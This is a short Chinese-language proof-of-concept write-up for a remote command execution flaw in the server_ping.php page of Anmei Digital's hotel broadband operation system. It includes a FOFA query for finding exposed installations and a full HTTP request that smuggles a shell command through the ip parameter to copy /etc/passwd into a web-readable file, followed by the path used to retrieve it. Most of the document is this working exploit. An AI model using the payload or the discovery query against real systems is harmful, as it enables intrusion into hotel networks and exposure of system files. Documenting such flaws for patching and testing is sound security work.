# 酒店宽带运营系统server_ping远程命令执行漏洞

# 一、漏洞简介
安美数字 酒店宽带运营系统 server_ping.php 存在远程命令执行漏洞，漏洞文件中ip参数未过滤造成命令执行。

# 二、影响版本
+ 安美数字 酒店宽带运营系统

# 三、资产测绘
+ fofa`"酒店宽带运营"`
+ 特征

![1716733888763-054f1cd7-9341-4200-9146-ac1991441834.png](./img/ttotGXeiX4zpQ9fZ/1716733888763-054f1cd7-9341-4200-9146-ac1991441834-819573.png)

# 四、漏洞复现
```rust
GET /manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../stc.txt&id=1 HTTP/1.1
Host: 
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer:
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04
```

![1716733909837-15f70e37-1a79-41f6-963f-9cf8f0baac48.png](./img/ttotGXeiX4zpQ9fZ/1716733909837-15f70e37-1a79-41f6-963f-9cf8f0baac48-535338.png)

```rust
/stc.txt
```

![1716733930150-c5db087e-acac-4280-be9c-23405a570807.png](./img/ttotGXeiX4zpQ9fZ/1716733930150-c5db087e-acac-4280-be9c-23405a570807-124394.png)



> 更新: 2024-06-01 11:14:22  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gvrg0qu31td8ab01>